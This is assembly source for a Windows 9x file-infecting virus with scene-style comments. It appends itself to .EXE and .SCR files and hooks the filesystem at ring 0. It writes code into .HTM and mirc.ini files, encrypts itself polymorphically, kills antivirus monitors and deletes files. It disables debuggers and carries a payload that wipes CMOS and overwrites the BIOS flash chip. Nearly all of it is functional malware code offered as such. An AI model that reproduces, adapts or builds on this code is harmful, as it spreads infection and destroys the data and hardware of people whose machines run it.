                   PUSH    DWORD PTR [EBP+(x-CHRIS)]

                   PUSH    DWORD PTR [EBP+(y-CHRIS)]

                   PUSH    DWORD PTR [EBP+(screen-CHRIS)]

                   CALL    [EBP+(BitBlt-CHRIS)]

                   MOV     ECX,99999

                   LOOP    $

          jmp loop_



   ;======================================== EXIT ==============================================



   FUERA:

                   CMP     BYTE PTR [EBP+(FLAGELO-CHRIS)],1

                   JE      HACKRO

        BYEBYE:

                   XOR     EDX,EDX

                   POP     DWORD PTR FS:[EDX]

                   POP     EAX

                   POPAD

                   POPFD

                   RET

                   A13 DD 0



   ;====================================== RING0 CODE ==========================================



   HACKRO:

                   PUSH    EAX

                   SIDT    [ESP-2]

                   POP     EAX

                   LEA     EBX, [EBP+(RING0_START-CHRIS)]

                   XCHG    [EAX+(3*8)], BX

                   ROR     EBX, 16

                   XCHG    [EAX+(3*8)+6], BX

                   INT     3

                   MOV     [EAX+(3*8)+6], BX

                   ROL     EBX, 16

                   MOV     [EAX+(3*8)], BX

                   JMP     BYEBYE



   RING0_START:



                   PUSHFD

                   PUSHAD

                   MOV     EAX, DR2

                   CMP     AX, 'HH'

                   JE      Exit_R0_Inst

                   LEA     EDI, [EBP+(VxD_Ring0_FileIO-CHRIS)]

                   MOV     AX, 20CDh

                   STOSW

                   MOV     [EDI], 00400032h

                   MOV     [EDI+(VxD_Call_1-VxD_Ring0_FileIO)-2], AX

                   MOV     [EDI+(VxD_Call_2-VxD_Ring0_FileIO)-2], AX

                   MOV     [EDI+(VxD_Call_1-VxD_Ring0_FileIO)], 0040000Dh

                   MOV     [EDI+(VxD_Call_2-VxD_Ring0_FileIO)], 00400067h

                   PUSH    Virus_Size_Mem

                   INT     20h

                   DW      GetHeap

                   DW      IFSMgr

   VxD_Call_1      =       $-6

                   POP     ECX

                   OR      EAX, EAX                ; Error occurred?

                   JZ      Exit_R0_Inst

                   MOV     ESI, EBP                ; Copy us to VxD-memory.

                   MOV     EDI, EAX

                   CLD

                   REP     MOVSB

                   MOV     [EAX+(Busy_Switch-CHRIS)], ECX

                   ADD     EAX, (Ring0_Hook-CHRIS)

                   PUSH    EAX

                   INT     20h

                   DW      InstallFileSystemAPIhook

                   DW      IFSMgr

   VxD_Call_2      =       $-6


                   POP     EBX

                   XCHG    ECX, EAX                ; Error?

                   JECXZ   Exit_R0_Inst

                   MOV     [EBX+(Prev_Handler-Ring0_Hook)], ECX

                   MOV     AX, 'HH'                 ; Mark us as resident.

                   MOV     DR2, EAX



   Exit_R0_Inst:   POPAD

                   POPFD

                   IRETD



         CONTADORE DD      0



   Ring0_Hook:

                   JMP     $+12345678h

   Busy_Switch     =       DWORD PTR $-4



                   PUSHFD

                   PUSHAD

                   CALL    Get_Delta

                   MOV     DWORD PTR [EBP+(Busy_Switch-CHRIS)], (JMP_Prev_Hook-Busy_Switch) - 4

                   CMP     DWORD PTR [ESP+(9*4)+(2*4)], IFSFN_OPEN

                   JNE     Exit_Stealth

                   FNOP

                   MOV     DR3,EBP



    ;Kagami no naka no honto no anata ga mieru." (I see the real you in the

            ;mirror.



                   INC     DWORD PTR [EBP+(CONTADORE-CHRIS)]

                   CALL    RANDOM

                   CMP     [EBP+(CONTADORE-CHRIS)],EAX

                   JE      RAISER ; HEYYYYYYYYYYY!!!!!!

   Exit_Stealth:

                   XOR     EAX,EAX

                   MOV     [EBP+(Busy_Switch-CHRIS)], EAX

                   POPAD

                   POPFD



   JMP_Prev_Hook:  JMP     DS:[12345678h]

   Prev_Handler    =       DWORD PTR $-4



   ;================================= INFECTION ROUTINE ============================================

   ;"Keri o tsukeyoze, Yagami." (Let's

   ;settle this Yagami.)





   TRASH_DIR:



                   CALL    DELETE_SHIT ; HELLO BB!

                   PUSHAD

                   LEA     EAX, [EBP+(Search_Record-CHRIS)]

                   PUSH    EAX

                   LEA     EAX, [EBP+(Search_Mask-CHRIS)]

                   PUSH    EAX

                   CALL    [EBP+(FindFirstFileA-CHRIS)]

                   MOV     ESI, EAX

                   INC     EAX

                   JZ      Exit_Inf_Dir



   Infect_Loop:    PUSHAD

                   LEA     EBX, [EBP+(Search_Record.Find_File_Name-CHRIS)]

                   MOV     ESI, EBX

                   CLD



   Find_End_Name:  LODSB



                   OR      AL, AL

                   JNZ     Find_End_Name

                   MOV     EAX, [ESI-5]

                   CALL    UPKASE

                   CMP     EAX, 'EXE.'             ; .EXE?

                   JE      Extension_OK

                   CMP     EAX, 'RCS.'             ; .SCR?

                   JE      Extension_OK

                   CMP     EAX, 'INI.'             ; .INI?

                   JE      Filex_O

                   CMP     EAX, 'MTH.'             ; .HTM OR .HTML?

                   JNE     END_TRAXDIR

                   JMP     Filex_OK



   Extension_OK:

                   MOV     EAX, [ESI-6]

                   CALL    UPKASE

                   CMP     EAX, 'XE.L'             ; NTOSKRN'L'.EXE?

                   JE      END_TRAXDIR



   WEIRD:

                   PUSH    EBX

                   CALL    [EBP+(GetFileAttributesA-CHRIS)]

                   CMP     EAX, -1

                   JE      END_TRAXDIR

                   MOV     ESI, EAX

                   AND     AL, NOT 00000001b

                   PUSH    EAX

                   PUSH    EBX

                   CALL    [EBP+(SetFileAttributesA-CHRIS)]

                   DEC     EAX

                   JNZ     END_TRAXDIR

                   PUSH    ESI

                   PUSH    EBX

                   PUSH    EAX

                   PUSH    EAX

                   PUSH    3

                   PUSH    EAX

                   PUSH    EAX

                   PUSH    80000000h OR 40000000h

                   PUSH    EBX

                   CALL    [EBP+(CreateFileA-CHRIS)]

                   MOV     [EBP+(File_Handle-CHRIS)], EAX

                   MOV     ESI, EAX

                   INC     EAX

                   JZ      Restore_Attr

                   PUSH    ESI

                   PUSH    0

                   PUSH    ESI

                   CALL    [EBP+(GetFileSize-CHRIS)]

                   CMP     EAX, Min_Size_Infect    ; ANTI-BAIT, NO INFECT DUMMIES

                   JB      CIERRA

                   CMP     EAX, Max_Size_Infect    ; OR GIANTS :)

                   JA      CIERRA

                   LEA     EAX, [EBP+(Time_Last_Write-CHRIS)]

                   PUSH    EAX

                   SUB     EAX, 8

                   PUSH    EAX

                   SUB     EAX, 8

                   PUSH    EAX

                   PUSH    ESI

                   CALL    [EBP+(GetFileTime-CHRIS)]



   Read_Header:

                   LEA     EBX, [EBP+(Header-CHRIS)]

                   PUSH    40h

                   POP     ECX

                   CALL    LEE

                   JNZ     CIERRA

                   CMP     BYTE PTR [EBX], 'M'    ; ANTI-HEURISTIC 'M'Z

                   JNE     CIERRA

                   CMP     [EBX.Reloc_Table], 40h

                   JB      CIERRA

                   MOV     ESI, [EBX+3Ch]

                   MOV     EAX, ESI

                   CALL    BUSKANTE

                   JZ      CIERRA

                   PUSH    92

                   POP     ECX

                   CALL    LEE


                   JNZ     CIERRA

                   CMP     BYTE PTR [EBX], 'P'     ; ANTI-HEURISTIC 'P'E

                   JNE     CIERRA

                   TEST    BYTE PTR [EBX.PE_Flags], 00000010b

                   JZ      CIERRA

                   TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b ; Don't infect DLL's.

                   JNZ     CIERRA

                   CMP     [EBX.CPU_Type], 14Ch

                   JNE     CIERRA

                   CMP     [EBX.Reserved_1], ' HH '

                   JE      CIERRA

                   MOV     BYTE PTR [EBP+(FLAG-CHRIS)],0

                   CMP     [EBX.Reserved_1], 'FOK.'      ; DONT CARE, FOR DEBUG PURPOSES

                   JE      PONFLAG

                   JMP     CONTENID



   PONFLAG:

                   INC     BYTE PTR [EBP+(FLAG-CHRIS)]


   CONTENID:

                   PUSH    ESI

                   MOVZX   EAX, [EBX.Number_Of_Sections]

                   DEC     AX

                   PUSH    40

                   POP     ECX

                   MUL     ECX

                   MOV     DX, [EBX.NT_Header_Size]

                   ADD     DX, 24

                   LEA     ECX, [ESI+EDX]

                   ADD     EAX, ECX

                   PUSH    EAX

                   CALL    BUSKANTE

                   LEA     ESI, [EBP+(Last_Section_Header-CHRIS)]
                   PUSH    EBX

                   MOV     EBX, ESI

                   PUSH    40

                   POP     ECX

                   CALL    LEE

                   POP     EBX

                   MOV     EAX, [ESI.Section_RVA]

                   ADD     EAX, [ESI.Section_Physical_Size]

                   MOV     [EBP+(Base_Displ-CHRIS)], EAX

                   XCHG    [EBX.EIP_RVA], EAX

                   MOV     [EBP+(Old_EIP_RVA-CHRIS)], EAX

                   MOV     EAX, [ESI.Section_Physical_Offset]

                   ADD     EAX, [ESI.Section_Physical_Size]

                   CALL    BUSKANTE

                   MOV     EAX, [ESI.Section_Physical_Size]

                   ADD     EAX, Virus_Size

                   MOV     ECX, [EBX.File_Align]

                   CALL    ALINEA

                   MOV     [ESI.Section_Physical_Size], EAX

                   XCHG    EDI, EAX

                   MOV     EAX, [ESI.Section_Virtual_Size]

                   MOV     ECX, [EBX.Object_Align]

                   CALL    ALINEA

                   SUB     [EBX.Image_Size], EAX

                   ADD     EAX, Virus_Size_Mem - 1



   Calc_Mem_Size:  INC     EAX

                   CALL    ALINEA

                   CMP     EAX, EDI

                   JB      Calc_Mem_Size

                   MOV     [ESI.Section_Virtual_Size], EAX

                   ADD     [EBX.Image_Size], EAX

                   OR      [ESI.Section_Flags], 11100000000000000000000000100000b



   ;================================== ENCRYPTION ROUTINE =========================================


   ;###############################################################################################

   ;#                   L.A.M.E. (LIGHT ANGEL MUTATION ENGINE) C0DE BY HenKy                      #

   ;###############################################################################################

   ;Benyou shinatte!" (Go
   ;       study more!)


                   CALL    RANDOM

                   MOV     DWORD PTR [EBP+(RDA_KEY-CHRIS)],EAX

                   CALL    RANDOM

                   MOV     DWORD PTR [EBP+(RDA_KEY2-CHRIS)],EAX

                   MOV     DWORD PTR [EBP+(BASECODE-CHRIS)], (Virus_Size-4)

                   CALL    RANDOM

                   MOV     DWORD PTR [EBP+(POLY_PUSH-CHRIS)],EAX

   NEXT:

                   MOV     EAX,4

                   CALL    brandom32

                   CMP     EAX,1

                   JE      POLYINC

                   CMP     EAX,2

                   JE      POLYDEC

                   CMP     EAX,3

                   JE      POLYNOT



   POLYNEG:        MOV     WORD PTR [EBP+(POLY-CHRIS)],09DF7H

                   MOV     BYTE PTR [EBP+(TYPEXX-CHRIS)],00H

                   JMP     NEXT2

   POLYINC:        MOV     WORD PTR [EBP+(POLY-CHRIS)],08DFFH

                   MOV     BYTE PTR [EBP+(TYPEXX-CHRIS)],0AAH

                   JMP     NEXT2

   POLYDEC:        MOV     WORD PTR [EBP+(POLY-CHRIS)],085FFH

                   MOV     BYTE PTR [EBP+(TYPEXX-CHRIS)],0BBH

                   JMP     NEXT2

   POLYNOT:        MOV     WORD PTR [EBP+(POLY-CHRIS)],095F7H

                   MOV     BYTE PTR [EBP+(TYPEXX-CHRIS)],0CCH



   NEXT2:

                   MOV     EAX,4

                   CALL    brandom32

                   CMP     EAX,1

                   JE      POLYEBX

                   CMP     EAX,2

                   JE      POLYEAX

                   CMP     EAX,3

                   JE      POLYEDX



   POLYECX:        MOV     BYTE PTR [EBP+(POLY_XOR_REG-CHRIS)],0C9H

                   MOV     BYTE PTR [EBP+(POLY_POP_WREG-CHRIS)],01H

                   MOV     BYTE PTR [EBP+(POLY_POP_REG-CHRIS)],059H

                   MOV     BYTE PTR [EBP+(POLY_XOR_REG2-CHRIS)],0C9H

                   MOV     BYTE PTR [EBP+(POLY_PUSH_WREG-CHRIS)],031H

                   MOV     BYTE PTR [EBP+(POLY_MOV-CHRIS)],021H

                   MOV     BYTE PTR [EBP+(POLY_TRAP-CHRIS)],09H

                   MOV     BYTE PTR [EBP+(POLY_LOOP-CHRIS)],0E0H

                   JMP     NEXT3



   POLYEBX:        MOV     BYTE PTR [EBP+(POLY_XOR_REG-CHRIS)],0DBH

                   MOV     BYTE PTR [EBP+(POLY_POP_WREG-CHRIS)],03H

                   MOV     BYTE PTR [EBP+(POLY_POP_REG-CHRIS)],05BH

                   MOV     BYTE PTR [EBP+(POLY_XOR_REG2-CHRIS)],0DBH

                   MOV     BYTE PTR [EBP+(POLY_PUSH_WREG-CHRIS)],033H

                   MOV     BYTE PTR [EBP+(POLY_MOV-CHRIS)],023H

                   MOV     BYTE PTR [EBP+(POLY_TRAP-CHRIS)],0BH

                   MOV     BYTE PTR [EBP+(POLY_LOOP-CHRIS)],0E2H

                   JMP     NEXT3



   POLYEAX:        MOV     BYTE PTR [EBP+(POLY_XOR_REG-CHRIS)],0C0H

                   MOV     BYTE PTR [EBP+(POLY_POP_WREG-CHRIS)],00H

                   MOV     BYTE PTR [EBP+(POLY_POP_REG-CHRIS)],058H

                   MOV     BYTE PTR [EBP+(POLY_XOR_REG2-CHRIS)],0C0H

                   MOV     BYTE PTR [EBP+(POLY_PUSH_WREG-CHRIS)],030H

                   MOV     BYTE PTR [EBP+(POLY_MOV-CHRIS)],020H

                   MOV     BYTE PTR [EBP+(POLY_TRAP-CHRIS)],08H

                   MOV     BYTE PTR [EBP+(POLY_LOOP-CHRIS)],0E0H

                   JMP     NEXT3



   POLYEDX:        MOV     BYTE PTR [EBP+(POLY_XOR_REG-CHRIS)],0D2H

                   MOV     BYTE PTR [EBP+(POLY_POP_WREG-CHRIS)],02H

                   MOV     BYTE PTR [EBP+(POLY_POP_REG-CHRIS)],05AH

                   MOV     BYTE PTR [EBP+(POLY_XOR_REG2-CHRIS)],0D2H

                   MOV     BYTE PTR [EBP+(POLY_PUSH_WREG-CHRIS)],032H

                   MOV     BYTE PTR [EBP+(POLY_MOV-CHRIS)],022H

                   MOV     BYTE PTR [EBP+(POLY_TRAP-CHRIS)],0AH

                   MOV     BYTE PTR [EBP+(POLY_LOOP-CHRIS)],0E2H

   NEXT3:



                   CALL    RANDOM

                   MOV     [EBP+(A1-CHRIS)], EAX   ; METAM0RPHER SUXZOR

                   CALL    RANDOM

                   MOV     [EBP+(A2-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A3-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A4-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A5-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A6-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A7-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A8-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A9-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A10-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A11-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A12-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A13-CHRIS)], EAX

                   CALL    RANDOM


                   MOV     [EBP+(A14-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A15-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A16-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A17-CHRIS)], EAX

                   CALL    RANDOM

                   MOV     [EBP+(A18-CHRIS)], EAX

                   CALL    RDA

                   CALL    RDA2

                   LEA     EDI, [EBP+(Buffer-CHRIS)]

                   PUSHAD

                   MOV     ESI, EBP

                   MOV     ECX, (Virus_Size / 4)

                   CLD

                   REP     MOVSD

                   CALL    RDA

                   CALL    RDA2

                   MOV     ECX, (Virus_End-CRYPTOTRON) / 4

                   CMP     BYTE PTR [EBP+(TYPEXX-CHRIS)],0AAH

                   JE      Encrypt_INC

                   CMP     BYTE PTR [EBP+(TYPEXX-CHRIS)],0BBH

                   JE      Encrypt_DEC

                   CMP     BYTE PTR [EBP+(TYPEXX-CHRIS)],0CCH

                   JE      Encrypt_NOT



   Encrypt_NEG:    SUB     EDI, 4

                   NEG     DWORD PTR [EDI]

                   LOOP    Encrypt_NEG

                   JMP     ECRYPT




   Encrypt_NOT:    SUB     EDI, 4

                   NOT     DWORD PTR [EDI]

                   LOOP    Encrypt_NOT

                   JMP     ECRYPT




   Encrypt_INC:    SUB     EDI,4

                   INC     DWORD PTR [EDI]

                   LOOP    Encrypt_INC

                   JMP     ECRYPT


   Encrypt_DEC:    SUB     EDI, 4

                   DEC     DWORD PTR [EDI]


                   LOOP    Encrypt_DEC

   ECRYPT:

                   POPAD

                   MOV     EDX, EDI

                   MOV     ECX, Virus_Size

                   CALL    ESCRIBE

                   POP     EAX

                   CALL    BUSKANTE

                   PUSH    40

                   POP     ECX

                   LEA     EDX, [EBP+(Last_Section_Header-CHRIS)]

                   CALL    ESCRIBE

                   PUSH    2

                   PUSH    EAX

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(File_Handle-CHRIS)]

                   CALL    [EBP+(SetFilePointer-CHRIS)]

                   XOR     EDX, EDX

                   MOV     EDI, [EBX.File_Align]

                   DIV     EDI

                   OR      EDX, EDX

                   JZ      PUTA_MARK

                   SUB     EDI, EDX



   Pad:            PUSH    1

                   POP     ECX

                   LEA     EDX, [EBP+(PADDI-CHRIS)]

                   CALL    ESCRIBE

                   DEC     EDI

                   JNZ     Pad


   PUTA_MARK:

                   CMP     BYTE PTR [EBP+(FLAG-CHRIS)],1

                   JNE     BASOSUCIO

                   MOV     [EBX.Reserved_1], ' HH '

                   JMP     ZALTO

   BASOSUCIO:

                   MOV     [EBX.Reserved_1], ' HH '
       ZALTO:

                   POP     EAX

                   CALL    BUSKANTE

                   PUSH    92

                   POP     ECX

                   MOV     EDX, EBX

                   CALL    ESCRIBE



   Restore_Stamp:  LEA     EAX, [EBP+(Time_Last_Write-CHRIS)]

                   PUSH    EAX

                   SUB     EAX, 8

                   PUSH    EAX

                   SUB     EAX, 8

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(File_Handle-CHRIS)]

                   CALL    [EBP+(SetFileTime-CHRIS)]

   CIERRA:         CALL    [EBP+(CloseHandle-CHRIS)]



   Restore_Attr:   CALL    [EBP+(SetFileAttributesA-CHRIS)]



   END_TRAXDIR:    POPAD

                   LEA     EAX, [EBP+(Search_Record-CHRIS)]

                   PUSH    EAX

                   PUSH    ESI

                   CALL    [EBP+(FindNextFileA-CHRIS)]

                   DEC     EAX

                   JZ      Infect_Loop

   Close_Find:     PUSH    ESI

                   CALL    [EBP+(FindClose-CHRIS)]

   Exit_Inf_Dir:   POPAD

                   RET

                   A12 DD 0


   Filex_O:

                   MOV     EAX, [ESI-8]

                   CALL    UPKASE

                   CMP     EAX, '.CRI'             ; MIRC.INI?

                   JNE     END_TRAXDIR

                   MOV     BYTE PTR [EBP+(IRC-CHRIS)],1




   ;===================================== INFECT WEB PAGES =================================



   Filex_OK:

                   CMP     BYTE PTR [EBP+(FLAGELO-CHRIS)],1

                   JE      END_TRAXDIR

                   PUSHAD

                   PUSH    EBX

                   CALL    [EBP+(GetFileAttributesA-CHRIS)]

                   CMP     EAX, -1

                   JE      END_TRAXDIR


                   MOV     ESI, EAX

                   AND     AL, NOT 00000001b

                   PUSH    EAX

                   PUSH    EBX


                   CALL    [EBP+(SetFileAttributesA-CHRIS)]

                   DEC     EAX

                   JNZ     END_TRAXDIR

                   PUSH    ESI

                   PUSH    EBX

                   PUSH    EAX

                   PUSH    EAX

                   PUSH    3

                   PUSH    EAX

                   PUSH    EAX

                   PUSH    80000000h OR 40000000h

                   PUSH    EBX

                   CALL    [EBP+(CreateFileA-CHRIS)]

                   MOV     [EBP+(File_Handle-CHRIS)], EAX

                   MOV     ESI, EAX

                   INC     EAX

                   JZ      EXCITE

                   LEA     EDI, [EBP+(Buffer-CHRIS)]

                   PUSHAD

                   CMP     BYTE PTR [EBP+(IRC-CHRIS)],1

                   JE      IRECEMOS

                   LEA     ESI, [EBP+(WEBCODE-CHRIS)]

                   MOV     ECX, (WEB_Size / 4)

                   JMP     NOIRC

        IRECEMOS:

                   LEA     ESI, [EBP+(IRC_CODE-CHRIS)]


                   MOV     ECX, (IRC_Size / 4)
         NOIRC:


                   CLD

                   REP     MOVSD

                   POPAD

                   MOV     EDX, EDI

                   MOV     ECX, WEB_Size

                   CALL    ESCRIBE

      EXCITE:

                   PUSH    DWORD PTR [EBP+(File_Handle-CHRIS)]

                   CALL    [EBP+(CloseHandle-CHRIS)]

                   POPAD

                   MOV     BYTE PTR [EBP+(IRC-CHRIS)],0

                   JMP     END_TRAXDIR





   ;===================================== PR0CEDURES ========================================



   REKURSIVITY:

                  CALL    SetDir

   RECURSIVE:

                  CALL    TRASH_DIR

                  LEA     EAX, [EBP+(win32_data_thang-CHRIS)]


                  PUSH    EAX

                  LEA     EAX, [EBP+(dirfiles-CHRIS)]

                  PUSH    EAX

                  CALL    [EBP+(FindFirstFileA-CHRIS)]

                  MOV     EDI, EAX

                  INC     EAX

                  JZ      @@nomorefiles



   @@processfile:


                  LEA     EAX, [EBP+(fileattr-CHRIS)]

                  MOV     AL, [EAX]

                  CMP     AL, 10h         ; directory ?

                  JNE     @@findnext

                  LEA     EDX, [EBP+(fullname-CHRIS)]

                  CMP     BYTE PTR [EDX], '.'

                  JE      @@findnext

                  CALL    SetDir


                  PUSH    EDI

                  LEA     EDX, [EBP+(fullname-CHRIS)]

                  CALL    RECURSIVE

                  POP     EDI

                  LEA     EDX, [EBP+(prev_dir-CHRIS)]

                  CALL    SetDir



   @@findnext:


                  LEA     EAX, [EBP+(win32_data_thang-CHRIS)]

                  PUSH    EAX

                  PUSH    EDI


                  CALL    [EBP+(FindNextFileA-CHRIS)]

                  OR      EAX, EAX

                  JNZ     @@processfile



   @@nomorefiles: RET

                  A11 DD 0




   ;====================================== ENCRYPTION ENGINES =====================================



   RDA:           PUSHAD


                  LEA     ESI,[EBP+(Rda_CHRIS-CHRIS)]


                  MOV     EBX,[EBP+(RDA_KEY-CHRIS)]


                  MOV     ECX,Rda_Size

   rda_loop:

                  XOR     BYTE PTR [ESI],BH

                  INC     ESI


                  LOOP    rda_loop

                  POPAD

                  RET




   RDA2:          PUSHAD


                  LEA     ESI,[EBP+(RDA2_CHRIS-CHRIS)]

                  MOV     EBX,[EBP+(RDA_KEY2-CHRIS)]

                  MOV     ECX,Rda2_Size

   rda2_loop:


                  XOR     BYTE PTR [ESI],BH

                  INC     ESI

                  LOOP    rda2_loop

                  POPAD


                  RET




   ;====================================== MORE ROUTINEZ ==========================================

   Rda_CHRIS:



   RANDOM:


                    PUSH EDX

   RDTSC            DB 0FH, 31H

                    POP EDX

                    RET


                    A10 DD 0



   ;"Ore no..kachi da!" (This is my...


   ;         victory!)



   KILL_MONITORS:

                  LEA     EDI,[EBP+(Monitors2Kill-CHRIS)] ;BENNY :)


   KM_L00p:

                    CALL    TerminateProc

                    XOR     AL,AL

                    SCASB

                    JNZ     $-1


                    CMP     BYTE PTR [EDI],0CCh

                    JNZ     KM_L00p

                    RET

                    A9 DD 0




   TerminateProc    PROC



                    XOR     EBX,EBX


                    PUSH    EDI

                    PUSH    EBX

                    CALL    [EBP+(FindWindowA-CHRIS)]


                    XCHG    EAX,ECX

                    JECXZ   TP_ErrorExit

                    PUSH    EBX

                    PUSH    EBX

                    PUSH    00000012h

                    PUSH    ECX


                    CALL    [EBP+(PostMessageA-CHRIS)]

                    MOV     CL,00h

                    org     $-1




   TP_ErrorExit:    STC

                  RET

                    A8 DD 0




   TerminateProc    ENDP





   ;"Anta ja moe ne."

   ;          (You've been burned, eh?)






   DELETE_SHIT:

   ;(BB!)

                   PUSHAD

                   LEA     EDI,[EBP+(XTABLE-CHRIS)]

                   MOV     ECX,N

   KILL:


                   PUSH    ECX

                   PUSH    EDI


                   CALL    [EBP+(DeleteFileA-CHRIS)]

                   POP     ECX

                   XOR     AL, AL

                   SCASB

                   JNZ     $-1


                   LOOP    KILL

                   POPAD

                   RET

                   A7 DD 0




   SetDir:

                   PUSH    EDX

                   CALL    [EBP+(SetCurrentDirectoryA-CHRIS)]

                   CALL    DELETE_SHIT


                   RET

                   A6 DD 0



   BUSKANTE:

                   PUSH    0

                   PUSH    0

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(File_Handle-CHRIS)]

                   CALL    [EBP+(SetFilePointer-CHRIS)]

                   INC     EAX

                   RET

                   A5 DD 0




   LEE:

                   PUSH    0



                   LEA     EAX, [EBP+(Bytes_Read-CHRIS)]

                   PUSH    EAX


                   PUSH    ECX

                   PUSH    EBX

                   PUSH    DWORD PTR [EBP+(File_Handle-CHRIS)]

                   CALL    [EBP+(ReadFile-CHRIS)]

                   DEC     EAX


                   RET

                   A4 DD 0



   ESCRIBE:

                   PUSH    0

                   LEA     EAX, [EBP+(Bytes_Read-CHRIS)]

                   PUSH    EAX


                   PUSH    ECX

                   PUSH    EDX

                   PUSH    12345678h

   File_Handle     =       DWORD PTR $-4


                   CALL    [EBP+(WriteFile-CHRIS)]

                   DEC     EAX

                   RET


                   A3 DD 0



   ALINEA:

                   XOR     EDX, EDX

                   DIV     ECX

                   OR      EDX, EDX


                   JZ      No_Round

                   INC     EAX

   No_Round:       MUL     ECX

                   RET

                   A2 DD 0




   UPKASE:

                   ROL     EAX, 8

                   CALL    Upcase_AL


                   ROL     EAX, 8

                   CALL    Upcase_AL

                   ROL     EAX, 8

                   CALL    Upcase_AL

                   ROL     EAX, 8

   Upcase_AL:      CMP     AL, 'a'


                   JB      Exit_Upcase_AL

                   CMP     AL, 'z'

                   JA      Exit_Upcase_AL

                   SUB     AL, 'a' - 'A'




   Exit_Upcase_AL: RET

                A1 DD 0




   random32 proc near



                   PUSH    ECX


                   XOR     ECX,ECX

                   MOV     EAX, DWORD PTR [EBP+(seed-CHRIS)]


                   MOV     CX,33


   rloop:

                   ADD     EAX, EAX

                   JNC     $+4

                   XOR     AL, 197


                   LOOP    rloop

                   MOV     DWORD PTR [EBP+(seed-CHRIS)], eax

                   POP     ECX

                   RET


   random32 endp

                   seed    DD 12345678h



   brandom32 proc near




                   PUSH    EDX


                   PUSH    ECX


                   MOV     EDX, 0

                   PUSH    EAX

                   CALL    random32


                   POP     ECX

                   DIV     ECX

                   XCHG    EAX, EDX

                   POP     ECX

                   POP     EDX


                   RET

   brandom32 endp



   ;==================================== DESTROY APPLEVEL DEBUGGERZ ===============================

   APPLEVEL:
                   PUSHFD  ; I LOVE W95/98 SYSTEMS

                   PUSHAD

                   XOR     EAX,EAX


                   MOV     CR0,EAX ;NICE NOT? :) R0 RULEZ

                   MOV     EDX,CR0

                   CMP     EDX,EAX

                   MOV     CR0,EDX


                   CMP     EDX,EAX

                   CMP     EBX,EDX

                   CMP     EBX,EDX


                   MOV     EBX,CR0

                   CMP     EAX,EBX ; Y0U C0ntinuE Ign0rinG ThE 0R0CHI P0weR?

                   MOV     DR0,EAX ; PRAY FOR THE DEAD DEBUGGERS: Ha hA HA HA hA Ha ha HA...


                   MOV     DR1,EAX

                   MOV     DR2,EAX ; SOFT-ICE IS 'REALLY' GOOD :(

                   MOV     DR3,EAX ; I PREFER TRW2000(AVALIABLE AT TRW2000.YEAH.NET)

                   MOV     DR5,EAX  ; FROM LIU TAOTAO (TR AUTHOR)


                   MOV     DR6,EAX   ; AN INCONVENIENT?: ONLY WORK IN W9x HAHAHA :)))

                   MOV     DR7,EAX

                   NOT     ESP

                   NOT     ESP      ; CONTINUE EMULATING ? IMPOSSIBLE.


                   NEG     ESP

                   NEG     ESP

                   INC     ESP

                   DEC     ESP


                   POPAD

                   POPFD

                   RET




   ;================================= HAPPY BIRTHDAY HenKy ;) ====================================



   RAISER:

                 FNOP

                 ;INT     01H ; AVOID LAME DESTROIYNG


           CLI

           MOV     CL, 64




   Nuke_CMOS_Byte:

                    DEC     CL


           JS      Nuke_BIOS

           MOV     AL, CL

           OUT     70h, AL


           XOR     AL, AL

           OUT     71h, AL

           JMP     Nuke_CMOS_Byte

   Nuke_BIOS:


           MOV     EDI, 8000384Ch

           MOV     BP, 0CF8h

           MOV     DX, 0CFEh

           CALL    IOForEEPROM


           MOV     DI, 0058h

           DEC     EDX


           MOV     WORD PTR [EBP+(Switch-CHRIS)], 0F24h
           CALL    IOForEEPROM


           MOV     EAX, 0E5555h

           MOV     ECX, 0E2AAAh

           CALL    EnableEEPROMToWrite


           MOV     BYTE PTR [EAX], 60h

           PUSH    ECX

           LOOP    $


           XOR     AH, AH

               MOV     WORD PTR [EAX], 'HH'   ; NICE NOT?? ;P


           XCHG    ECX, EAX

           LOOP    $

           MOV     EAX, 0F5555h

           POP     ECX

           MOV     CH, 0AAh


           CALL    EnableEEPROMToWrite

           MOV     BYTE PTR [EAX], 20h

           LOOP    $


           MOV     AH, 0E0h

           MOV     [EAX], AL


           MOV     WORD PTR [EBP+(Switch-CHRIS)], 100Ch

           CALL    IOForEEPROM





   EnableEEPROMToWrite:



           MOV     [EAX], CL

           MOV     [ECX], AL


           MOV     BYTE PTR [EAX], 80h

           MOV     [EAX], CL

           MOV     [ECX], AL


           RET

   IOForEEPROM:

           XCHG    EDI, EAX

           XCHG    EDX, EBP

           OUT     DX, EAX


           XCHG    EDI, EAX

           XCHG    EDX, EBP

           IN      AL, DX




           OR      AL, 44h

   Switch          =       WORD PTR $-2

           XCHG    EDI, EAX


           XCHG    EDX, EBP

           OUT     DX, EAX

           XCHG    EDI, EAX

           XCHG    EDX, EBP

           OUT     DX, AL

           RET




   ;======================================= FINAL CODE =============================================


    Get_Delta:

                   CALL    Get_EIP

   Get_EIP:        POP     EBP

                   SUB     EBP, (Get_EIP-CHRIS)

                   RET


   VxD_Ring0_FileIO:


                   INT     20h

                   DW      Ring0_FileIO

                   DW      IFSMgr

                   RET


   ;================================== USEFUL DATA ==================================================

   GDI32_Name              DB      'GDI32',0

   BitBlt_Name             DB      'BitBlt',0

   USER32_Name             DB      'USER32', 0

   GetDC_Name              DB      'GetDC',0

   FindWindowA_Name        DB      'FindWindowA',0

   PostMessageA_Name       DB      'PostMessageA',0

   MessageBoxA_Name        DB      'MessageBoxA', 0

   Search_Mask             DB      '*.*', 0

